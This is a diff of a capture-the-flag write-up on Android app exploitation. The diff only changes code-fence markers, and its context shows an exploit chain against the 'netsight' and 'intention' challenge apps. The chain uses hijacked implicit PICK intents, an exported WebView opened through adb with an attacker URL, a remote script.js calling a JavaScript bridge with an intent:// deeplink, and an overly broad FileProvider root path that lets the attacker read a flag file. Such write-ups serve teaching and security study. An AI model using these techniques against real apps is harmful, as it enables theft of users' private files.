@@ -52,7 +52,7 @@ So the attack path here is clear, we need to create an exploit application that 
 
 ### Exploit
 #### MainActivity.kt - Attacker Application
-```kotlin=
+```kotlin
 override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -109,7 +109,7 @@ Now might be a good time to discuss that android intents are categorized as eith
 **1. Explicit Intents**
 An explicit intent is one that you use to launch a specific app component, such as a particular activity or service in your app. Notice that the Intent()s being created specify which activity to open/use. For example:
 
-```kotlin=
+```kotlin
 val demoIntent = Intent()
 demoIntent.setClassName("com.kuro.intention", "com.kuro.intention.FlagSender")
 startActivity(demoIntent)
@@ -119,7 +119,7 @@ startActivity(demoIntent)
 **2. Implicit Intents**
 An implicit intent specifies an action that can invoke any app on the device able to perform the action. Using an implicit intent is useful when your app cannot perform the action, but other apps probably can and you’d like the user to pick which app to use. For example:
 
-```kotlin=
+```kotlin
 val demoIntent = Intent("android.intent.action.VIEW")
 startActivity(demoIntent)
 ```
@@ -139,7 +139,7 @@ When creating the exploit code for the vulnerability, we need to take note of th
 
 1. We need to add an intent-filter to our activity so that it intercepts the implicit intent. If we review the openImage method, we can recall that it used the action `android.intent.action.PICK` and specified a mime type of `image/*`. We can also set the priority to `999` which isn't really important for this challenge, but on real-world engagements this could allow our attacker application to appear first on the list if a chooser dialog opens for implicit intents. 
 
-```xml=
+```xml
 <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -186,7 +186,7 @@ As we know by now, an activity being set to exported means that it can be access
 ![](/images/writeups/S1AJdTqWa.png)
 
 Within the WebviewActivity's onCreate method, we can see that the webview opens up a url supplied by an external intent via the string extra "url". This in itself can already be classified as a vulnerability since unauthorized applications should not be able to start up arbitrary web pages. We can verify that we do have the capability to do so by performing the adb command:
-```shell=
+```shell
 $ adb shell am start -n com.tcpip.netsight/.WebviewActivity --es "url" "https://blackbeard666.github.io"
 ```
 
@@ -213,7 +213,7 @@ Additionally, we should review lines 18-19 from the code. Setting the 0x1 flag o
 
 For this, we want to review the `@xml/provider_paths.xml` file which defines which directories or files could be shared by the content provider:
 
-```xml=
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <paths>
     <root-path name="root" path=""/>
@@ -232,7 +232,7 @@ For the first stage of the exploit, we want the netsight application to open up 
 
 You might ask: "*Wait, no deeplinks were defined via the intent-filter stuff, what deeplink do we provide then*?". In Android, we can specify deep links using the **intent:// scheme**. This scheme allows us to **create Intent objects and supply intent data** in a flexible and dynamic manner. I used the following code to generate what deeplink I would need to supply in order to call the PickerActivity and control the flag data extra:
 
-```kotlin=
+```kotlin
 var pickerIntent = Intent()
 pickerIntent.setClassName("com.tcpip.netsight", "com.tcpip.netsight.PickerActivity")
 pickerIntent.data = Uri.parse("content://com.tcpip.netsight.FileProvider/internal_files/files/flaggo.txt")
@@ -250,14 +250,14 @@ Result from logcat:
 ```
 
 From this point, I spun up a quick web instance via glitch which contained the following `script.js` file:
-```javascript=
+```javascript
 // https://roasted-citrine-howler.glitch.me/script.js
 netsight.showToast('testpwn was here');
 netsight.accessDeeplink('intent://com.tcpip.netsight.FileProvider/flaggo.txt#Intent;scheme=content;component=com.tcpip.netsight/.PickerActivity;end');
 ```
 
 After which, we send the payload to start the exported webview activity and open up the url we supply:
-```kotlin=
+```kotlin
 // start intent to load picker activity from webview
         var webviewIntent = Intent()
         webviewIntent.setClassName("com.tcpip.netsight", "com.tcpip.netsight.WebviewActivity")
@@ -268,7 +268,7 @@ After which, we send the payload to start the exported webview activity and open
 
 ### Exploit, Stage 2
 If everything goes smoothly, the netsight webview will basically call the following:
-```kotlin=
+```kotlin
 var pickerIntent = Intent()
 pickerIntent.setClassName("com.tcpip.netsight", "com.tcpip.netsight.PickerActivity")
 pickerIntent.data = Uri.parse("content://com.tcpip.netsight.FileProvider/internal_files/files/flaggo.txt")
@@ -276,7 +276,7 @@ startActivity(pickerIntent)
 ```
 
 The picker activity will then perform a start activity using the implicit intent action `android.intent.action.PICK`, so we need to setup another activity for our exploit app in order to intercept the call and the intent data that we need from it:
-```kotlin=
+```kotlin
 <activity
             android:name=".PickerExploit"
             android:exported="true"
@@ -294,7 +294,7 @@ The picker activity will then perform a start activity using the implicit intent
 Since the PickerActivity from netsight will be sending an intent with the structure of `content://com.tcpip.netsight.FileProvider`, I found out it was better to define an intent-filter this way in order to automatically intercept the intent. 
 
 Once the PickerActivity starts the activity, we should be ready to receive the intent then retrieve the contents of the file pointed to by the intent.data since we should already have read access to it:
-```kotlin=
+```kotlin
 class PickerExploit : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
